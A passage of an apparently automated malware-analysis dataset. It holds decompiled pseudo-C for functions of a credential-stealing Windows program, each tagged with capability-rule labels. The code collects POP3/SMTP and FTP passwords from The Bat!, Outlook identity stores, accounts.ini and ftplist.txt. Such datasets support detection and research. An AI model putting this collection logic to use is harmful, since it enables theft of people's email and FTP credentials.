        "decompiled_code": "\nvoid __cdecl fcn.0040e566(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*0x414b57 == NULL) {\n        return;\n    }\n    var_4h = fcn.004018cf(0x105);\n    var_8h = 0x104;\n    (**0x414b57)(arg_ch, arg_ch, var_4h, &var_8h);\n    uVar1 = fcn.0041066a(var_4h);\n    if (3 < uVar1) {\n        fcn.00404351(arg_8h, var_4h, \".xml\", 0xbeef0000);\n    }\n    fcn.004018b8(var_4h);\n    return;\n}\n",
        "token_count": 188
    },
    "0040e63a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e63a(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    ulong uVar9;\n    uint in_stack_ffffff48;\n    uchar *in_stack_ffffff4c;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *var_18h;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar3 = fcn.00401f36(arg_ch);\n    if (iVar3 == 0) {\n        return;\n    }\n    iVar3 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        var_24h = var_4h >> 1;\n        pcVar4 = fcn.00402a3e(var_8h, var_24h);\n        var_14h = pcVar4;\n        if (pcVar4 == NULL) {\n            var_14h = fcn.004018cf(var_4h);\n            fcn.00401906(var_8h, var_14h, var_4h);\n            pcVar4 = var_14h;\n        }\n        while ((pcVar4 != NULL && (*pcVar4 != '\\0'))) {\n            pcVar4 = \"<POP3_Password2\";\n            while (iVar3 = fcn.0041081a(),  iVar3 == 0) {\n                iVar3 = -1;\n                pcVar8 = pcVar4;\n                do {\n                    pcVar4 = pcVar8;\n                    if (iVar3 == 0) break;\n                    iVar3 = iVar3 + -1;\n                    pcVar4 = pcVar8 + 1;\n                    cVar1 = *pcVar8;\n                    pcVar8 = pcVar4;\n                } while (cVar1 != '\\0');\n                if (*pcVar4 == '\\0') goto code_r0x0040e795;\n            }\n            iVar3 = fcn.00410808();\n            if (iVar3 == 0) break;\n            var_18h = iVar3 + 1;\n            uVar9 = fcn.0041081a();\n            puVar5 = uVar9;\n            if (puVar5 == NULL) break;\n            uVar2 = *puVar5;\n            *puVar5 = 0;\n            uVar6 = fcn.0041066a(var_18h, uVar9 >> 0x20 & 0xffffff00 | uVar2, puVar5);\n            if (uVar6 != 0) {\n                var_1ch = uVar6;\n                var_20h = fcn.00402a1d(var_18h);\n                iVar7 = fcn.00402b0d(var_20h, var_1ch);\n                if (iVar7 != 0) {\n                    var_1ch = var_1ch >> 1;\n                    var_28h = *0x416ba2;\n                    var_2ch = *0x416ba6;\n                    iVar7 = fcn.004043dc(var_20h, &var_1ch, &var_2ch);\n                    if (iVar7 != 0) {\n                        fcn.00401569(arg_8h, 0xbeef0001);\n                        fcn.004015cb(arg_8h, var_18h);\n                        in_stack_ffffff4c = arg_8h;\n                        fcn.0040159f(arg_8h, var_20h, var_1ch);\n                    }\n                }\n                in_stack_ffffff48 = var_20h;\n                fcn.004018b8(var_20h);\n            }\n            *in_stack_ffffff4c = in_stack_ffffff48;\n            pcVar4 = iVar3 + 1;\n        }\ncode_r0x0040e795:\n        fcn.00401569(arg_8h, 0xbeef0002);\n        fcn.0040159f(arg_8h, var_8h, var_4h);\n        fcn.004018b8(var_14h);\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 1005
    },
    "0040e9f9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e9f9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_01;\n    uint32_t uVar3;\n    uint in_stack_fffff75c;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.004018cf(0x105);\n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_ch, 0x414845);\n            arg_ch_01 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            iVar1 = fcn.00401d71(arg_8h, arg_ch_01, \"Path\", 0);\n            if (iVar1 != 0) {\n                uVar2 = fcn.00401df8(iVar1, \"\\\\PocoSystem.ini\");\n                uVar3 = fcn.00410742(\"Program\", \"DataPath\", 0x414847, arg_ch_00, 0x104, uVar2, uVar2);\n                if (3 < uVar3) {\n                    in_stack_fffff75c = arg_10h;\n                    fcn.00404351(arg_10h, arg_ch_00, \"accounts.ini\", 0xbeef0000);\n                }\n                fcn.004018b8(in_stack_fffff75c);\n            }\n            fcn.0040e9f9(arg_8h, arg_ch_01, arg_10h);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(iVar1);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0();\n    }\n    fcn.004018b8(arg_ch_00);\n    return;\n}\n",
        "token_count": 578
    },
    "0040eba3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040eba3(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t var_848h;\n    uint var_844h;\n    uint var_840h;\n    uint var_83ch;\n    uint var_838h;\n    uint var_834h;\n    int32_t var_830h;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_8h, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401e4c(arg_8h_00, &var_80ch);\n            var_814h = fcn.00401d71(arg_8h, var_810h, \"EmailAddress\", 0);\n            var_818h = fcn.00401d71(arg_8h, var_810h, \"Technology\", 0);\n            var_81ch = fcn.00401d71(arg_8h, var_810h, \"PopServer\", 0);\n            var_820h = fcn.00401d71(arg_8h, var_810h, \"PopPort\", &var_824h);\n            var_828h = fcn.00401d71(arg_8h, var_810h, \"PopAccount\", 0);\n            var_82ch = fcn.00401d71(arg_8h, var_810h, \"PopPassword\", &var_830h);\n            var_834h = fcn.00401d71(arg_8h, var_810h, \"SmtpServer\", 0);\n            var_838h = fcn.00401d71(arg_8h, var_810h, \"SmtpPort\", &var_83ch);\n            var_840h = fcn.00401d71(arg_8h, var_810h, \"SmtpAccount\", 0);\n            var_844h = fcn.00401d71(arg_8h, var_810h, \"SmtpPassword\", &var_848h);\n            if ((var_814h != 0) && ((var_830h != 0 || (var_848h != 0)))) {\n                fcn.00401569(arg_10h, 0xbeef0000);\n                fcn.004015cb(arg_10h, var_814h);\n                fcn.004015cb(arg_10h, var_818h);\n                fcn.004015cb(arg_10h, var_81ch);\n                fcn.0040159f(arg_10h, var_820h, var_824h);\n                fcn.004015cb(arg_10h, var_828h);\n                fcn.0040159f(arg_10h, var_82ch, var_830h);\n                fcn.004015cb(arg_10h, var_834h);\n                fcn.0040159f(arg_10h, var_838h, var_83ch);\n                fcn.004015cb(arg_10h, var_840h);\n                fcn.0040159f(arg_10h, var_844h, var_848h);\n            }\n            fcn.0040eba3(arg_8h, var_810h, arg_10h);\n            fcn.004018b8(var_810h);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_820h);\n            fcn.004018b8(var_828h);\n            fcn.004018b8(var_82ch);\n            fcn.004018b8(var_834h);\n            fcn.004018b8(var_838h);\n            fcn.004018b8(var_840h);\n            fcn.004018b8(var_844h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 1109
    },
    "0040ef6c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ef6c(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t *var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00401d71(arg_ch, \"Software\\\\RIT\\\\The Bat!\", \"Working Directory\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eef7(arg_8h, iVar1);\n        fcn.004018b8(var_4h);\n    }\n    iVar1 = fcn.00401d71(arg_ch, \"Software\\\\RIT\\\\The Bat!\", \"ProgramDir\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eef7(arg_8h, iVar1);\n        fcn.004018b8(var_4h);\n    }\n    iVar1 = fcn.00401d71(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", \"Default\", 0);\n    if (iVar1 != 0) {\n        var_4h = iVar1;\n        fcn.0040eef7(arg_8h, iVar1);\n        fcn.004018b8(var_4h);\n    }\n    var_8h = fcn.00401d71(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", \"Count\", &var_ch);\n    if (var_8h != NULL) {\n        if (var_ch == 4) {\n            var_10h = *var_8h;\n            if (10000 < var_10h) {\n                var_10h = 10000;\n            }\n            for (; var_10h != 0; var_10h = var_10h - 1) {\n                fcn.004107ae(&var_38h, \"Dir #%d\", var_10h);\n                iVar1 = fcn.00401d71(arg_ch, \"Software\\\\RIT\\\\The Bat!\\\\Users depot\", &var_38h, &var_3ch);\n                if (iVar1 != 0) {\n                    var_4h = iVar1;\n                    if (3 < var_3ch) {\n                        fcn.0040eef7(arg_8h, iVar1);\n                    }\n                    fcn.004018b8(var_4h);\n                }\n            }\n        }\n        fcn.004018b8(var_8h);\n    }\n    return;\n}\n",
        "token_count": 595
    },
    "0040f178": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f178(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    uint in_stack_ffffffb4;\n    uint uVar7;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar5 = 0;\n    pcVar6 = \"SMTP Email Address\";\n    do {\n        iVar2 = fcn.00401d71(arg_ch, arg_10h, pcVar6, &fcn.0040f178::var_4h);\n        if (iVar2 != 0) {\n            uVar7 = arg_8h;\n            uVar3 = fcn.0040f12e(arg_8h, pcVar6, iVar2, var_4h, 0xbeef0000);\n            uVar5 = uVar5 | uVar3;\n            fcn.004018b8(uVar7);\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"POP3 Password2\";\n    do {\n        iVar2 = fcn.00401d71(arg_ch, arg_10h, pcVar6, &fcn.0040f178::var_4h);\n        if (iVar2 != 0) {\n            fcn.00401569(arg_8h, 0xbeef0003);\n            fcn.004015cb(arg_8h, pcVar6);\n            uVar7 = arg_8h;\n            fcn.0040159f(arg_8h, iVar2, var_4h);\n            in_stack_ffffffb4 = 0x40f20a;\n            fcn.004018b8(uVar7);\n            uVar5 = uVar5 | 1;\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"POP3 Password\";\n    do {\n        pcVar4 = fcn.00401d71(arg_ch, arg_10h, pcVar6, &fcn.0040f178::var_4h);\n        if (pcVar4 != NULL) {\n            if (1 < var_4h) {\n                if (*pcVar4 == '\\x01') {\n                    var_4h = var_4h - 1;\n                    uVar3 = fcn.0040f12e(arg_8h, pcVar6, pcVar4 + 1, var_4h, 0xbeef0001);\n                    uVar5 = uVar5 | uVar3;\n                }\n                else if (*pcVar4 == '\\x02') {\n                    var_4h = var_4h - 1;\n                    iVar2 = fcn.004043dc(pcVar4 + 1, &fcn.0040f178::var_4h, 0);\n                    if (iVar2 != 0) {\n                        in_stack_ffffffb4 = arg_8h;\n                        uVar3 = fcn.0040f12e(arg_8h, pcVar6, pcVar4 + 1, var_4h, 0xbeef0002);\n                        uVar5 = uVar5 | uVar3;\n                    }\n                }\n            }\n            fcn.004018b8(in_stack_ffffffb4);\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n    } while (*pcVar6 != '\\0');\n    pcVar6 = \"POP3 Port\";\n    do {\n        iVar2 = fcn.00401d71(arg_ch, arg_10h, pcVar6, &fcn.0040f178::var_4h);\n        if (iVar2 != 0) {\n            fcn.00401569(arg_8h, 0xbeef0004);\n            fcn.004015cb(arg_8h, pcVar6);\n            uVar7 = arg_8h;\n            fcn.0040159f(arg_8h, iVar2, var_4h);\n            fcn.004018b8(uVar7);\n            uVar5 = uVar5 | 1;\n        }\n        iVar2 = -1;\n        pcVar4 = pcVar6;\n        do {\n            pcVar6 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar6 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar6;\n        } while (cVar1 != '\\0');\n        if (*pcVar6 == '\\0') {\n            if (uVar5 != 0) {\n                fcn.00401569(arg_8h, 0xbeef0010);\n            }\n            return uVar5;\n        }\n    } while( true );\n}\n",
        "token_count": 1333
    },
    "0040f456": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040f456(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint *arg_1ch, int32_t arg_20h)\n\n{\n    int32_t arg_ch_00;\n    int32_t arg_ch_01;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    \n    arg_ch_00 = fcn.00402aaa(arg_ch);\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    fcn.004107ae(&var_64h, \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\", *arg_1ch, *(arg_1ch + 1), \n                 *(arg_1ch + 6), *(arg_1ch + 2), *(arg_1ch + 9), *(arg_1ch + 10), *(arg_1ch + 0xb), *(arg_1ch + 3), \n                 *(arg_1ch + 0xd), *(arg_1ch + 0xe), *(arg_1ch + 0xf));\n    if (arg_20h == 0) {\n        fcn.00401569(arg_18h, arg_8h);\n        fcn.004015cb(arg_18h, arg_ch_00);\n        fcn.004015cb(arg_18h, &var_64h);\n        fcn.0040159f(arg_18h, arg_10h, arg_14h);\n    }\n    else {\n        arg_ch_01 = fcn.00402abb(arg_10h, arg_14h);\n        if (arg_ch_01 != 0) {\n            fcn.00401569(arg_18h, arg_8h);\n            fcn.004015cb(arg_18h, arg_ch_00);\n            fcn.004015cb(arg_18h, &var_64h);\n            fcn.004015cb(arg_18h, arg_ch_01);\n            fcn.004018b8(arg_ch_01);\n        }\n    }\n    fcn.004018b8(arg_ch_00);\n    return;\n}\n",
        "token_count": 508
    },
    "0040f545": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f545(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *var_c1ch;\n    int32_t var_c18h;\n    int32_t var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_c00h;\n    uint var_800h;\n    uint var_400h;\n    \n    fcn.0040a2a9(arg_8h, &var_400h, arg_18h);\n    fcn.0040a2f4(arg_8h, arg_ch, &var_800h, arg_18h);\n    fcn.004106e2(0, 0, arg_10h, 0xffffffff, &var_c00h, 0x3ff, 0, 0);\n    var_c10h = 0x10;\n    var_c0ch = 2;\n    var_c08h = 0;\n    var_c04h = 0;\n    (**(*arg_18h + 0x44))(arg_18h, 0, arg_8h, arg_ch, arg_10h, &var_c18h, &var_c14h, &var_c10h, 0);\n    if (var_c18h == 0) {\n        return;\n    }\n    if (var_c14h == 0) {\n        return;\n    }\n    iVar1 = fcn.00410712(&var_400h, \"identification\");\n    if (iVar1 != 0) {\n        puVar2 = &var_400h;\n        iVar1 = fcn.00410712(puVar2, \"identitymgr\");\n        if (iVar1 != 0) goto code_r0x0040f6df;\n    }\n    var_c1ch = 0xbeef0005;\n    iVar1 = fcn.00410712();\n    if (iVar1 != 0) {\n        var_c1ch = 0xbeef0006;\n        iVar1 = fcn.00410712();\n        if (iVar1 != 0) {\n            var_c1ch = 0xbeef0007;\n            puVar2 = &var_800h;\n            iVar1 = fcn.00410712();\n            if (iVar1 != 0) goto code_r0x0040f6df;\n        }\n    }\n    if (var_c1ch == 0xbeef0007) {\n        fcn.0040f456(0xbeef0007, arg_10h, var_c14h, var_c18h, arg_14h, arg_ch, 0);\n        puVar2 = var_c1ch;\n    }\n    else {\n        fcn.0040f456(var_c1ch, arg_10h, var_c14h, var_c18h, arg_14h, arg_ch, 1);\n        puVar2 = var_c1ch;\n    }\ncode_r0x0040f6df:\n    fcn.0041079c(var_c14h, puVar2);\n    return;\n}\n",
        "token_count": 718
    },
    "0040f6ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f6ee(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *var_4h;\n    \n    if (*0x414b5b != NULL) {\n        var_4h = NULL;\n        iVar1 = (**0x414b5b)(&var_4h, 0, 0, 0);\n        if ((-1 < iVar1) && (var_4h != NULL)) {\n            fcn.0040a45e(arg_8h, var_4h, fcn.0040f545);\n            (**(*var_4h + 8))(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0040f906": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f906(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x60, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"ftplist.txt\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 443
    },
    "0040f984": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040f998)\n// WARNING: Removing unreachable block (ram,0x0040f9ba)\n// WARNING: Removing unreachable block (ram,0x0040f9c2)\n// WARNING: Removing unreachable block (ram,0x0040fa7f)\n// WARNING: Removing unreachable block (ram,0x0040f9c7)\n// WARNING: Removing unreachable block (ram,0x0040fa0a)\n// WARNING: Removing unreachable block (ram,0x0040fa18)\n// WARNING: Removing unreachable block (ram,0x0040fa0f)\n// WARNING: Removing unreachable block (ram,0x0040fa29)\n// WARNING: Removing unreachable block (ram,0x0040fa88)\n\nuint fcn.0040f984(void)\n\n{\n    uint in_EAX;\n    \n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "0040fa2e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040fa2e(uint noname_0, int32_t arg_ch, int32_t arg_10h)\n\n{\n    *(arg_10h + 0xb8) = *(arg_ch + 8);\n    *(arg_10h + 0xc4) = *(arg_ch + 0xc);\n    *(arg_10h + 0xb4) = *(arg_ch + 0x10);\n    if (*0x4173a1 != 0) {\n        fcn.004012dc(*0x4173a1, *0x41739d);\n    }\n    return 0;\n}\n",
        "token_count": 140
    },
    "0040fa90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040faa4)\n// WARNING: Removing unreachable block (ram,0x0040fae3)\n// WARNING: Removing unreachable block (ram,0x0040fabf)\n// WARNING: Removing unreachable block (ram,0x0040fae9)\n\nvoid fcn.0040fa90(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 103
    },
    "0040faec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040fafc)\n// WARNING: Removing unreachable block (ram,0x0040fb04)\n// WARNING: Removing unreachable block (ram,0x0040fb0b)\n// WARNING: Removing unreachable block (ram,0x0040fb06)\n// WARNING: Removing unreachable block (ram,0x0040fb10)\n\nvoid fcn.0040faec(void)\n\n{\n    return;\n}\n",
        "token_count": 97
    },
    "00410223": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410237)\n// WARNING: Removing unreachable block (ram,0x00410241)\n// WARNING: Removing unreachable block (ram,0x0041024a)\n// WARNING: Removing unreachable block (ram,0x0041024f)\n// WARNING: Removing unreachable block (ram,0x00410272)\n// WARNING: Removing unreachable block (ram,0x00410299)\n// WARNING: Removing unreachable block (ram,0x004102a2)\n// WARNING: Removing unreachable block (ram,0x004102ae)\n// WARNING: Removing unreachable block (ram,0x004102f2)\n// WARNING: Removing unreachable block (ram,0x004102b3)\n// WARNING: Removing unreachable block (ram,0x004102c9)\n// WARNING: Removing unreachable block (ram,0x004102ec)\n// WARNING: Removing unreachable block (ram,0x004102f8)\n// WARNING: Removing unreachable block (ram,0x00410308)\n// WARNING: Removing unreachable block (ram,0x00410316)\n// WARNING: Removing unreachable block (ram,0x0041031c)\n// WARNING: Removing unreachable block (ram,0x00410325)\n// WARNING: Removing unreachable block (ram,0x00410311)\n\nuint fcn.00410223(void)\n\n{\n    uint in_EAX;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return in_EAX;\n}\n",
        "token_count": 357
    },
    "0041032d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410342)\n// WARNING: Removing unreachable block (ram,0x0041034c)\n// WARNING: Removing unreachable block (ram,0x00410355)\n// WARNING: Removing unreachable block (ram,0x0041035b)\n// WARNING: Removing unreachable block (ram,0x004104f7)\n// WARNING: Removing unreachable block (ram,0x004104ff)\n// WARNING: Removing unreachable block (ram,0x00410366)\n// WARNING: Removing unreachable block (ram,0x00410374)\n// WARNING: Removing unreachable block (ram,0x0041038b)\n// WARNING: Removing unreachable block (ram,0x004103ac)\n// WARNING: Removing unreachable block (ram,0x004103b1)\n// WARNING: Removing unreachable block (ram,0x004103df)\n// WARNING: Removing unreachable block (ram,0x00410400)\n// WARNING: Removing unreachable block (ram,0x0041040a)\n// WARNING: Removing unreachable block (ram,0x00410417)\n// WARNING: Removing unreachable block (ram,0x0041043a)\n// WARNING: Removing unreachable block (ram,0x00410498)\n// WARNING: Removing unreachable block (ram,0x00410480)\n// WARNING: Removing unreachable block (ram,0x00410486)\n// WARNING: Removing unreachable block (ram,0x0041048f)\n// WARNING: Removing unreachable block (ram,0x0041049f)\n// WARNING: Removing unreachable block (ram,0x004104ac)\n// WARNING: Removing unreachable block (ram,0x004104ba)\n// WARNING: Removing unreachable block (ram,0x004104c0)\n// WARNING: Removing unreachable block (ram,0x004104ca)\n// WARNING: Removing unreachable block (ram,0x004104d0)\n// WARNING: Removing unreachable block (ram,0x004104db)\n// WARNING: Removing unreachable block (ram,0x004104e3)\n// WARNING: Removing unreachable block (ram,0x004104eb)\n// WARNING: Removing unreachable block (ram,0x004104ed)\n// WARNING: Removing unreachable block (ram,0x00410386)\n// WARNING: Removing unreachable block (ram,0x004104f5)\n\nuint fcn.0041032d(void)\n\n{\n    uint in_EAX;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return in_EAX;\n}\n",
        "token_count": 594
    },
    "00410880": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
